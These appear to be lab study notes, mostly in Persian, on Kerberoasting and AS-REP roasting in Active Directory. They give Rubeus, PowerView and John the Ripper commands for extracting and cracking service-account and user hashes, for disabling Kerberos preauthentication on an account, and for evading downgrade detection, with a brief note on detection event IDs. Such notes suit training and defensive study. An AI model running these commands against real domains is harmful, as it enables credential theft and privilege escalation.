
[[Kerberoasing]]
[[Kerberoasting]]


**Escalation حقوق — Kerberoast**  
کرک آفلاین (بدون اتصال شبکه‌ای به دامنه) رمزهای عبور حساب‌های سرویس.

بلیت جلسهٔ Kerberos (TGS) یک بخش سروری دارد که با هش رمز عبور حساب سرویس رمز می‌شود. این باعث می‌شود بتوان یک تیکت درخواست کرد و سپس آن را به‌صورت آفلاین مورد حملهٔ پسوردی (کرک) قرار داد.

چون رمزهای حساب‌های سرویس (غیر ماشینی) به‌ندرت تغییر می‌کنند، این حمله محبوب و مؤثر شده اس




**PowerView**
```
Get-DomainUser -spn
```

با استفاده از این دستور میتونیم spn  هایی که کاربر میتونه ازشون استفاده کنه رو ببینیم


![[Pasted image 20250916065502.png]]


**serviceprincipalname* ----> this is name for name is SPN

![[Pasted image 20250916065853.png]]





## معنی و کاربرد هر خطی که فرستادی

1. `Rubeus.exe kerberoast /stats`  
    — **کار:** فهرست و آمار حساب‌هایی که قابل Kerberoast هستند را بهت نشان می‌دهد: چند SPN وجود دارد، چه enctypes پشتیبانی می‌شوند (مثلاً RC4 یا AES)، و چقدر هدف «خوش‌خوراکِ» کرک هست.  
    — **چرا مفید است:** قبل از هر کاری باید بفهمی چه حساب‌هایی هدف مناسبی‌اند و آیا استفادهٔ RC4 وجود دارد (که روند کرک را آسان‌تر یا روش حمله را بی‌صداتر می‌کند).
    
2. `Rubeus.exe kerberoast /user:svcadmin /simple`  
    — **کار:** فقط برای حساب `svcadmin` یک درخواست TGS ساده می‌فرستد و تیکتِ مربوط (قسمت رمز‌شده با کلید سرویس) را می‌گیرد. `/simple` باعث می‌شود خروجی کم‌حجم‌تر باشد.  
    — **کی استفاده می‌شود:** وقتی می‌خواهی روی یک حساب مشخص تمرکز کنی (مثلاً سرویس حساب مشکوک) و فقط تیکت خام را بگیری.
    
3. توضیح درباره‌ی `/rc4opsec` و نکته‌ی Encryption Downgrade  
    — متن اصلی اشاره کرده که بعضی دفاع‌ها کاهش نوع رمزنگاری Kerberos (downgrade to RC4) را شناسایی می‌کنند. اگر می‌خواهی از تشخیصِ downgrade اجتناب کنی، به‌دنبال حساب‌هایی باش که فقط RC4/HMAC را پشتیبانی می‌کنند (در این حالت نیازی به «downgrade» از سوی مهاجم نیست

![[Pasted image 20250916070152.png]]




![[Pasted image 20250916065221.png]]

- `/simple`  
    درخواست TGS ساده/کم‌جزییات (معمولاً فقط تیکت‌های پایه را می‌گیرد بدون استخراج اضافی) — خلاصه‌تر و سریع‌تر.
    
- `/rc4opsec`  
    فیلتر/گزینش به‌نفع حساب‌هایی که فقط یا عمدتاً `RC4_HMAC` (ETYPE 0x17 / RC4) را پشتیبانی می‌کنند — دلیلش جلوگیری از «مکانیزم‌های تشخیصی» است که پایین‌آوردن نوع رمزنگاری (encryption downgrade) را شناسایی می‌کنند.  
    (به عبارت دیگر: دنبال حساب‌هایی بگرد که فقط RC4 می‌سازند چون بعضی تشخیص‌ها وقتی یک مهاجم تلاش به downgrade می‌کند، آن را آشکار می‌کنند.)
    
- `/outfile:hashes.txt`  
    ذخیرهٔ خروجی — معمولاً Hash/票 (TGS-encrypted data) که برای کرک آفلاین نیاز داری را در فایل می‌ریزد.


![[Pasted image 20250916070310.png]]
![[Pasted image 20250916070327.png]]

```
john --wordlist=/home/kali/worllist.txt /home/kali/desktop/hash.txt
```

![[Pasted image 20250916070508.png]]



## نکته : 
**بالا بردن امتیاز — Kerberoasting هدف‌دار — AS-REPS**  
اگر تنظیمات `UserAccountControl` یک کاربر طوری باشند که گزینهٔ «نیاز به پیش‌احراز هویت Kerberos» (Do not require Kerberos preauthentication) غیرفعال شده باشد، ممکن است بتوان `AS-REP` قابل کرک آن کاربر را گرفت و به‌صورت آفلاین آن را بروت‌فورس کرد.

با دسترسی کافی (مثل `GenericWrite` یا `GenericAll`) می‌توان این گزینهٔ پیش‌احراز را نیز برای یک حساب، اجباری غیرفعال کرد.

[[AS-REP Roasting]]


**AS-REP roasting**:
زمانی رخ می‌دهد که پیش‌احراز روی حسابِ کاربری غیرفعال است و مهاجم AS-REP را برای آن کاربر می‌گیرد و آفلاین کرک می‌کند.


**پیدا کردن حساب‌هایی که پیش‌احراز غیرفعال دارند**  
(نیاز به ماژول ActiveDirectory در پاورشل؛ اجرای دستور روی Domain Controller یا سیستم با RSAT)

```
Get-ADUser -Filter * -Properties DoesNotRequirePreAuth | Where-Object {$_.DoesNotRequirePreAuth -eq $true} | Select SamAccountName
```

## چگونه این مشکل را پیدا و تشخیص بدیم (Detection)

دنبال تغییرات در AD باش: EventIDهای مربوط به تغییر شیء دایرکتوری (مثلاً 5136 — Directory Service Changes) یا 4738 (A user account was changed). اگر `userAccountControl` برای یک کاربر تغییر کرده، ثبت خواهد شد.



- `Find-InterestingDomainAcl -ResolveGUIDS | ?{... "RDPUsers"}`  
    → ACLهای «جالب/خطرناک» را پیدا می‌کند و فقط آیتم‌هایی که مربوط به `RDPUsers` هستند را نشان می‌دهد (برای دیدن چه دسترسی‌هایی این گروه دارد).
    
- `Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose`  
    → بیت `0x00400000` (معادل `DoesNotRequirePreAuth`) را روی کاربر `Control1User` toggle می‌کند. اگر فعال شود، آن کاربر دیگر نیاز به Kerberos preauth ندارد (آسیب‌پذیر به AS-REP roasting).
    
- `Get-DomainUser -PreauthNotRequired -Verbose`  
    → لیست کاربران دامنه را می‌آورد که preauth برایشان غیرفعال است.
    

- **`Get-ASREPHash -UserName VPN1user -Verbose`**  
    → درخواست/استخراجِ **AS-REP** (بخش رمز‌شده پاسخ KDC) برای کاربر `VPN1user` و نمایش جزئیات (verbose).
    
- **`Invoke-ASREPRoast -Verbose`**  
    → اسکریپت/ماژول اتوماتیک که همهٔ کاربران با «پیش‌احراز غیرفعال» را پیدا می‌کند، برایشان AS-REP می‌گیرد و هش‌ها/تیکت‌ها را ذخیره می‌کند (با خروجی verbose).
    
- **`john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt`**  
    → استفاده از **John the Ripper** برای کرک آفلاین فایل هش‌های AS-REP (`asrephashes.txt`) با یک wordlist مشخص (فایل `10k-worst-pass.txt`).


![[Pasted image 20250916071533.png]]
